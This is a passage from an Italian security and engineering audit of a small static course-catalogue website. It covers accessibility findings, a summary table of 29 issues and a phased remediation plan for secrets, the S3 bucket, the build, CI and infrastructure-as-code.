**Conseguenze.** L'onboarding di una nuova persona non è possibile a partire dal repository. Questa voce è il moltiplicatore di `OPS-01`: è la ragione per cui il *bus factor* resta 1 anche in presenza di documentazione formalmente esistente.

---

#### `DOC-02` - Metadati di progetto mancanti - **S5 Bassa**

Nessun `LICENSE` (progetto di un ente pubblico o parapubblico senza licenza dichiarata), nessun `CONTRIBUTING`, nessun `CODEOWNERS`, nessuna registrazione delle decisioni architetturali. In `package.json` mancano `author`, `license`, `repository`. La cronologia Git consta di due commit, di cui uno con messaggio `"inizio progetto"`: non fornisce alcuna tracciabilità delle modifiche.

---

#### `FE-01` - Contrasto insufficiente per WCAG AA sul testo secondario - **S5 Bassa**

**Posizione:** [as-is/site/style.css:1](as-is/site/style.css#L1), [6](as-is/site/style.css#L6), [9](as-is/site/style.css#L9), [13](as-is/site/style.css#L13)

Rapporti di contrasto calcolati sui colori dichiarati:

| Coppia | Rapporto | Soglia AA (testo normale: 4.5) |
|---|---:|---|
| `--mu` `#777777` su `--bg` `#0d0d0d` | **4.34** | **non conforme** |
| `--or` `#ff6a00` su `#0d0d0d` | 6.77 | conforme |
| `--fg` `#e8e8e8` su `#0d0d0d` | 15.86 | conforme |

Il colore `--mu` è applicato a `.sub`, `th` (dimensionato `.78rem`) e `footer` (`.8rem`): tutto testo di piccole dimensioni, cui si applica la soglia 4.5 e non quella per testo grande. Portare `--mu` a circa `#8a8a8a` risolve senza alterare la resa visiva. Per un sito istituzionale di ente formativo la conformità all'accessibilità è di norma un requisito, non una scelta.

---

#### `FE-02` - Semantica della tabella incompleta - **S5 Bassa**

**Posizione:** [as-is/src/build.mjs:35-41](as-is/src/build.mjs#L35-L41)

La tabella è priva di `<caption>` e gli header non dichiarano `scope="col"`. Il piè di tabella usa `<td colspan="2">` dove sarebbe appropriato `<th scope="row">`. Uno screen reader non annuncia la relazione tra celle e intestazioni. Manca inoltre la dichiarazione `lang` sui codici corso e non è presente alcuna favicon.

---

## 5. Quadro riassuntivo

| ID | Criticità | Gravità | Area |
|---|---|:---:|---|
| `BLD-01` | Build silenziosamente inefficace su Windows, exit code 0 | **S1** | Build |
| `SEC-01` | Segreti in chiaro, presenti nella storia Git | **S2** | Sicurezza |
| `SEC-02` | Bucket S3 scrivibile/cancellabile da anonimi (`s3:*`, `Principal *`) | **S2** | Sicurezza |
| `SEC-03` | Public access block disattivato su 4 controlli | **S2** | Sicurezza |
| `BLD-02` | Totale ore errato: 260 anziché 320 | **S2** | Correttezza |
| `OPS-01` | Rilascio manuale, bus factor 1, macchina unica | **S2** | Processo |
| `OPS-02` | Nessun rollback, versionamento o backup (incidente storico) | **S2** | Processo |
| `SEC-04` | Iniezione HTML nel generatore | **S3** | Sicurezza |
| `SEC-05` | Nessun TLS, sito servito in HTTP | **S3** | Sicurezza |
| `OPS-03` | Rilascio venerdì pomeriggio senza presidio | **S3** | Processo |
| `OPS-04` | Verifica solo visiva, nessun monitoraggio | **S3** | Processo |
| `OPS-05` | La procedura istruisce a ripristinare il bucket pubblico | **S3** | Processo |
| `IAC-01` | Due IaC divergenti, nessuna è la produzione | **S3** | Infrastruttura |
| `IAC-02` | Terraform puntato su emulatore locale | **S3** | Infrastruttura |
| `DAT-01` | Dati personali probabili senza titolare, retention, backup | **S3** | Conformità |
| `SEC-06` | FTP in chiaro | **S4** | Sicurezza |
| `SEC-07` | Account AWS condiviso, nessuna identità nominale | **S4** | Sicurezza |
| `BLD-03` | Percorsi dipendenti dalla CWD | **S4** | Build |
| `BLD-04` | Nessun lockfile, dipendenza inutilizzata, nessun `engines` | **S4** | Build |
| `BLD-05` | Nessun test, nessuna CI | **S4** | Qualità |
| `IAC-03` | Nessun backend Terraform, stato locale non protetto | **S4** | Infrastruttura |
| `IAC-04` | Tabella `iscrizioni` senza backup né proprietario | **S4** | Infrastruttura |
| `IAC-05` | Nessuna separazione ambienti, nessun tagging | **S4** | Governance |
| `DAT-02` | Nessuna validazione dati, `NaN` propagato silenziosamente | **S4** | Dati |
| `DOC-01` | Documentazione assente o non trasferibile | **S4** | Documentazione |
| `DAT-03` | Docente unico su tutti i corsi | **S5** | Dati |
| `DOC-02` | Metadati di progetto mancanti | **S5** | Documentazione |
| `FE-01` | Contrasto non conforme WCAG AA | **S5** | Accessibilità |
| `FE-02` | Semantica tabella incompleta | **S5** | Accessibilità |

**Totale: 29 voci** - 1 bloccante, 6 critiche, 8 alte, 10 medie, 4 basse.

---

## 6. Piano di azione

Il piano è ordinato per **sequenza di esecuzione**, non per gravità: alcune correzioni gravi dipendono da altre meno gravi. In particolare `BLD-01` va per primo perché finché il build non produce output osservabile **nessuna correzione è verificabile**.

Nessuno degli interventi descritti è stato applicato.

---

### Fase 0 - Contenimento immediato (giornata 1)

Interventi da eseguire prima di qualunque altra attività, in quest'ordine.

| # | Azione | Risolve | Note operative |
|---|---|---|---|
| 0.1 | **Ruotare tutti i segreti esposti**: password FTP, token `ghp_…`. Revocare il token sul provider di origine. | `SEC-01` | Da fare *per primo* e indipendentemente da tutto il resto: i segreti sono da considerare già compromessi. Verificare sui log del provider se il token è stato usato da IP non attesi. |
| 0.2 | **Restringere la policy del bucket** a `s3:GetObject` con `Principal: "*"`, rimuovendo `s3:*`. | `SEC-02` | Applicare **a mano sulla console**, non via IaC: come da `IAC-01` non è noto quale IaC corrisponda alla produzione. È l'intervento che chiude lo scenario di defacement e cancellazione. |
| 0.3 | **Abilitare il versionamento del bucket** e una lifecycle rule di retention (es. 90 giorni sulle versioni precedenti). | `OPS-02` | Prerequisito di qualsiasi rollback. Costo trascurabile per un sito statico. |
| 0.4 | **Inventariare lo stato reale su AWS**: bucket esistenti, policy effettive, public access block, contenuto e dimensione della tabella `iscrizioni`, e quale endpoint serve realmente il portale (S3 o FTP). | `IAC-01`, `DAT-01` | Attività conoscitiva, non modificativa. **Il repository non è una fonte attendibile**: tutto il resto del piano dipende da questo censimento. |
| 0.5 | **Correggere `DEPLOY.md` punto 7**: rimuovere l'istruzione "rimettere public" e sostituirla con l'indicazione di non modificare i permessi e di escalare. | `OPS-05` | Senza questo, il punto 0.2 viene annullato al rilascio successivo. Costo: due righe di testo; è l'intervento con il miglior rapporto tra effetto e sforzo dell'intero piano. |
| 0.6 | **Sospendere i rilasci del venerdì pomeriggio**, spostandoli a inizio settimana in orario presidiato. | `OPS-03` | Provvedimento organizzativo, a costo zero, che riduce la finestra di esposizione da due giorni a poche ore. |

---

### Fase 1 - Ripristino della correttezza (settimana 1)

Rendere il build funzionante, verificabile e corretto. È il presupposto tecnico dell'automazione in Fase 2.

| # | Azione | Risolve |
|---|---|---|
| 1.1 | Sostituire la guardia di ingresso in [build.mjs:64](as-is/src/build.mjs#L64) con un confronto corretto tra URL, es. `import.meta.url === pathToFileURL(process.argv[1]).href`, oppure eliminare la guardia e separare `main()` in un file `bin/`. Verificare che il build produca `dist/` su Windows. | `BLD-01` |
| 1.2 | Rimuovere lo `slice(1)` da `totaleOre`. Verificare che il totale pubblicato sia **320**. Comunicare la correzione alla segreteria: il dato pubblicato finora era errato. | `BLD-02` |
| 1.3 | Introdurre una funzione di escaping HTML (`& < > " '`) e applicarla a **tutti** i valori interpolati in `render()`, inclusi `istituto`, `biennio`, `codice`, `titolo`, `ore`, `versione`. | `SEC-04` |
| 1.4 | Risolvere i percorsi da `import.meta.dirname` anziché dalla CWD; il build deve funzionare da qualunque directory. | `BLD-03` |
| 1.5 | Validare `corsi.json` all'ingresso: `corsi` è un array non vuoto, ogni voce ha `codice`/`titolo` stringhe non vuote e `ore` numero finito positivo. **Uscire con codice ≠ 0 e messaggio esplicito** in caso di violazione. | `DAT-02` |
| 1.6 | Aggiungere test su `totaleOre` (totale corretto, array vuoto, `ore` mancante ⇒ errore) e su `render` (escaping effettivo, presenza di tutte le righe). Usare `node:test`, senza nuove dipendenze. Aggiungere lo script `test` a `package.json`. | `BLD-05` |
| 1.7 | Rimuovere la dipendenza `left-pad` (non utilizzata), generare il lockfile, dichiarare `engines.node` coerente con le API usate. | `BLD-04` |
| 1.8 | Aggiungere un `.gitignore` che escluda `dist/`, `node_modules/`, `*.tfstate*`, `.env` e `config/impostazioni.txt`. | `BLD-04`, `IAC-03` |

**Criterio di completamento della fase:** `npm run build` su Windows produce `dist/index.html` con totale 320, `npm test` passa, e un titolo di corso contenente `<script>` compare nella pagina come testo visibile e non come markup eseguito.

---

### Fase 2 - Rilascio automatico e ripetibile (settimane 2-3)

Elimina i punti singoli di guasto umani e materiali.

| # | Azione | Risolve |
|---|---|---|
| 2.1 | Creare una pipeline CI (es. GitHub Actions) che, su push a `main`: installa da lockfile, esegue `npm test`, esegue il build, **verifica l'esistenza e la coerenza di `dist/versione.json`**, e sincronizza su S3. | `OPS-01`, `BLD-05` |
| 2.2 | Autenticare la pipeline con **OIDC verso un ruolo IAM dedicato** con permessi limitati al solo bucket del sito. Nessuna chiave statica in CI. | `SEC-07`, `SEC-01` |
| 2.3 | **Dismettere il canale FTP** una volta confermato (punto 0.4) che S3 è la produzione: chiudere l'account FTP, rimuovere FileZilla dalla procedura. | `SEC-06`, `IAC-01` |
| 2.4 | Aggiungere uno **smoke test post-deploy**: richiesta HTTP a `index.html` e a `versione.json`, verifica dello status 200 e che la versione corrisponda al commit appena pubblicato. Fallimento ⇒ pipeline rossa. | `OPS-04`, `BLD-01` |
| 2.5 | Implementare il **rollback come procedura eseguibile**: ripubblicazione dell'artefatto del commit precedente, in un comando, sfruttando il versionamento abilitato al punto 0.3. Provarlo almeno una volta. | `OPS-02` |
| 2.6 | **Riscrivere `DEPLOY.md`** descrivendo il processo automatico: come si pubblica (merge su `main`), come si verifica, come si esegue il rollback, chi è il referente. Eliminare ogni riferimento a macchine fisiche e a persone come dipendenza. | `DOC-01`, `OPS-01` |

**Criterio di completamento della fase:** una modifica a `corsi.json` raggiunge la produzione senza intervento manuale, e una persona che non ha mai visto il progetto riesce a pubblicare leggendo solo il `README`.

---

### Fase 3 - Bonifica di infrastruttura e sicurezza (settimane 3-5)

| # | Azione | Risolve |
|---|---|---|
| 3.1 | **Scegliere un solo strumento IaC** (raccomandato: Terraform) ed eliminare l'altro. Allineare la definizione allo stato reale censito al punto 0.4, quindi importare le risorse esistenti (`terraform import`) per porre la produzione sotto gestione dichiarativa. | `IAC-01` |
| 3.2 | **Rimuovere dal provider Terraform** gli endpoint `127.0.0.1`, le credenziali `test` e gli `skip_*`. Se serve un ambiente locale, isolarlo in una configurazione separata e documentata. | `IAC-02` |
| 3.3 | Configurare un **backend remoto S3 con state locking**, cifratura a riposo e versionamento sul bucket di stato. | `IAC-03` |
| 3.4 | **Ripristinare il public access block** su tutti e quattro i controlli e servire il sito tramite **CloudFront con OAC**, mantenendo il bucket completamente privato. | `SEC-03`, `SEC-02` |
| 3.5 | Aggiungere **certificato ACM, dominio personalizzato, redirect HTTP→HTTPS e header di sicurezza** (HSTS, `X-Content-Type-Options`, CSP restrittiva, `Referrer-Policy`). | `SEC-05` |
| 3.6 | Parametrizzare i nomi delle risorse, introdurre la **separazione tra ambienti** e applicare tag `Environment`/`Owner`/`CostCenter` a tutte le risorse. | `IAC-05` |
| 3.7 | Sostituire l'utenza condivisa di segreteria con **identità IAM nominali, MFA obbligatoria e ruoli a privilegio minimo**; abilitare CloudTrail. | `SEC-07` |
| 3.8 | Introdurre **scansione automatica dei segreti** (es. `gitleaks`) come hook di pre-commit e come controllo in CI, per prevenire la ricomparsa di `SEC-01`. | `SEC-01` |

---

### Fase 4 - Dati, conformità e qualità (settimane 4-6)

| # | Azione | Risolve |
|---|---|---|
| 4.1 | **Esaminare e classificare il contenuto della tabella `iscrizioni`.** Determinare se contiene dati personali, chi ne è titolare e quale sia la finalità. Documentare l'esito. | `DAT-01`, `IAC-04` |
| 4.2 | In base all'esito di 4.1: **se contiene dati personali** - abilitare PITR, cifratura con chiave gestita, definire una politica di conservazione con TTL, censirla nel registro dei trattamenti, predisporre la procedura per le richieste degli interessati. **Se è vuota o inutilizzata** - dismetterla formalmente dopo backup di sicurezza. | `DAT-01`, `IAC-04` |
| 4.3 | Verificare con la segreteria l'anomalia del campo `docente` (identico su tutti i corsi) e decidere se il dato va corretto, popolato o rimosso dal file versionato in quanto dato personale non necessario. | `DAT-03`, `SEC-04` |
| 4.4 | Portare `--mu` a un valore con contrasto ≥ 4.5 su `#0d0d0d` (es. `#8a8a8a`) e verificare l'intera tavolozza. | `FE-01` |
| 4.5 | Completare la semantica della tabella: `<caption>`, `scope="col"` sugli header, `<th scope="row">` nel piè. Aggiungere favicon e `meta description`. | `FE-02` |
| 4.6 | Scrivere un `README` utile (scopo, prerequisiti, build, test, pubblicazione, referente), aggiungere `LICENSE`, `CODEOWNERS` e completare i metadati di `package.json`. Adottare una convenzione sui messaggi di commit. | `DOC-01`, `DOC-02` |

---

## 7. Ordine di priorità in caso di risorse limitate

Qualora non fosse possibile eseguire l'intero piano, i **sei interventi** con il maggior rapporto tra riduzione del rischio e sforzo richiesto sono, nell'ordine:

1. **0.1** - Rotazione dei segreti. *Ore. Chiude una compromissione già in atto.*
2. **0.2 + 0.5** - Restrizione della policy del bucket **e** correzione del punto 7 di `DEPLOY.md`. *Ore. Vanno insieme: la seconda senza la prima è inutile, la prima senza la seconda dura una settimana.*
3. **1.1** - Correzione della guardia del build. *Una riga. Rende osservabile un guasto che oggi è invisibile ed è la causa più probabile dell'incidente documentato.*
4. **1.2** - Correzione del totale ore. *Una riga. Elimina un errore visibile sul sito pubblico.*
5. **0.3** - Versionamento del bucket. *Minuti. Rende per la prima volta possibile un rollback.*
6. **1.6** - Test su `totaleOre` e `render`. *Ore. Impedisce la reintroduzione di 1.1 e 1.2.*

Le prime cinque voci sono realizzabili in una giornata di lavoro complessiva e rimuovono la criticità bloccante, tre delle sei critiche e lo scenario di perdita definitiva del sito.

---

## 8. Osservazioni conclusive

Il progetto è piccolo, e questo è l'aspetto favorevole della perizia: 250 righe di codice consentono una bonifica integrale in poche settimane, e le due funzioni che contengono i difetti di correttezza (`totaleOre`, `render`) sono **già esportate e già testabili** senza alcuna rifattorizzazione. Il foglio di stile è competente e la struttura HTML generata è sostanzialmente corretta. Non vi è nulla, in questo sistema, che richieda una riscrittura.

Il problema non è la quantità di codice ma **l'assenza completa di un anello di retroazione**. Il build non segnala i propri fallimenti, la procedura non verifica i propri risultati, l'infrastruttura come codice non descrive l'infrastruttura reale, e l'unico allarme di sicurezza che scatta regolarmente è documentato come un fastidio da aggirare. In un sistema così, i difetti non vengono scoperti: vengono *subiti*, e la loro causa non viene mai attribuita. L'incidente di due giorni registrato in `DEPLOY.md` non è un evento sfortunato - è il comportamento prevedibile di questa architettura, e `BLD-01` ne offre una spiegazione tecnica completa.

Ne segue l'indicazione peritale principale: **le prime correzioni da eseguire non sono le più gravi, ma quelle che rendono il sistema osservabile.** Un build che fallisce rumorosamente e uno smoke test post-rilascio valgono, in questo contesto, più di qualsiasi altro intervento - perché sono la condizione perché tutti gli altri risultino verificabili e duraturi.

Si segnala infine che la voce di rischio più costosa da sanare non è tecnica. `OPS-01` e `DOC-01` - una persona sola, una macchina sola, una documentazione che rinvia a sé stessa - non si risolvono con una modifica al codice, e sono le uniche criticità di questo elenco il cui tempo di rimedio non dipende da chi scrive software.

---

*Documento redatto ai soli fini di analisi. Nessuna modifica è stata apportata al codice, alla configurazione o all'infrastruttura. Tutte le verifiche dinamiche sono state eseguite in ambiente locale isolato, senza contatto con account AWS o con l'host FTP.*
